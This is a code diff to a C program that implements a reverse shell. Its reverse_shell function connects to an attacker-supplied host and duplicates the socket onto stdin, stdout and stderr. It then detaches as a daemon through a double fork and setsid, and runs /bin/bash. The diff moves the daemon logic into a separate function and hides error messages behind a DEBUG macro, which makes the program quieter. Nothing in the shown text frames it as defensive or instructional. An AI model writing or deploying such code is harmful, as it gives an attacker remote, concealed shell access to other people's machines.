@@ -9,65 +9,80 @@
 #include <string.h>
 #include <stdlib.h>
 
-// server 
-//
-// socket
-//
-// bind
-//
-//
-// listen
-//
-//
-// accept
-//
-// recv / send
-//
+
+#ifdef DEBUG
+
+#define PRINT_DEBUG(msg) perror(msg)
+
+#else
+
+#define PRINT_DEBUG
 
 
-// client
-
-// socket
-//
-// connect
-//
-//
-// recv/send
-//
-//
-// close
-
-
-// clients
-//
-// syn 
-// syn - ack
-//
-// ack
-//
-//
+#endif
 
 
 #define return_defer(label) goto label
 
-// 22 "ssh"
-//
-// 
-//
+// use the exposed global environment variables
 extern char **environ;
 
+
+bool daemonize(const char *dir_path)
+{
+
+	// fork() and kill parent
+	
+	#define C_CHILD_PROCESS 0
+	
+	int pid = fork();
+	if (pid != C_CHILD_PROCESS)
+	{
+		exit(0);
+	}
+
+	// call setsid()
+	setsid();
+
+	// fork() and kil parent
+	pid = fork();
+	if(pid != C_CHILD_PROCESS)
+	{
+		exit(0);
+	}
+
+	
+	// close unused fds
+
+	if (dir_path != NULL)
+	{
+		// chroot()
+		
+
+
+		// chdir() to chroot dir
+	}
+
+
+	return true;
+}
 
 
 bool reverse_shell(char *host,char *service)
 {
 	// open tcp connection to the attacker server
 	
+	// create a tcp socket
+
 	int client_fd = socket(AF_INET,SOCK_STREAM,0);
 	if (client_fd == -1)
 	{
 		return_defer(socket_failed);
 	}
 
+
+	// fill the sockaddr structure the right way
+	
 	struct addrinfo hints,*result;
 	
 	memset(&hints,0,sizeof(hints));	
@@ -81,6 +96,9 @@ bool reverse_shell(char *host,char *service)
 		return_defer(getaddrinfo_failed);
 	}
 
+
+	// connect to the attacker machine
+	
 	status = connect(client_fd,result->ai_addr,result->ai_addrlen);
 	if (status == -1)
 	{
@@ -89,68 +107,41 @@ bool reverse_shell(char *host,char *service)
 
 
 
-	//
-	//
-	//
+
 	// duplicate file descriptor (0 - stdin, 1 - stdout , 2 - stdout)
-	//
-	//
+	#define C_STD_INPUT 0
+	#define C_STD_OUTPUT 1
+	#define C_STD_ERROR 2	
 	
-	dup2(client_fd,0);
-	dup2(client_fd,1);
-	dup2(client_fd,2);
+	dup2(client_fd,C_STD_INPUT);
+	dup2(client_fd,C_STD_OUTPUT);
+	dup2(client_fd,C_STD_ERROR);
 
 	// make this a daemon
-	// fork() and kill parent
-	//
-	#define CHILD_PROCESS 0
-	int pid = fork();
-	if (pid != CHILD_PROCESS)
-	{
-		exit(0);
-	}
 
-	// call setsid()
-	setsid();
-
-	// fork() and kil parent
-	pid = fork();
-	if(pid != CHILD_PROCESS)
-	{
-		exit(0);
-	}
-
-	
-	// close unused fds
-	//
-	// chroot()
-	//
-	// chdir() to chroot dir
-	//
+	daemonize(NULL);
 
 	// spawn a shell program to replace the current binary
 	
-	puts("execve ");
+	
 	char *const argvp[] = {"/bin/bash",NULL};
 	
 	execve("/bin/bash",argvp,environ);	
-
-	perror("shouldn't happen  ");
 
 	return true;
 
 
 connect_failed:
-	perror("connect : ");
+	PRINT_DEBUG("connect : ");
 	return_defer(reverse_failed);
 
 
 getaddrinfo_failed:
-	perror("getaddrinfo : ");
+	PRINT_DEBUG("getaddrinfo : ");
 	return_defer(reverse_failed);
 
 socket_failed:
-	perror("socket : ");
+	PRINT_DEBUG("socket : ");
 
 reverse_failed:
 	return false;
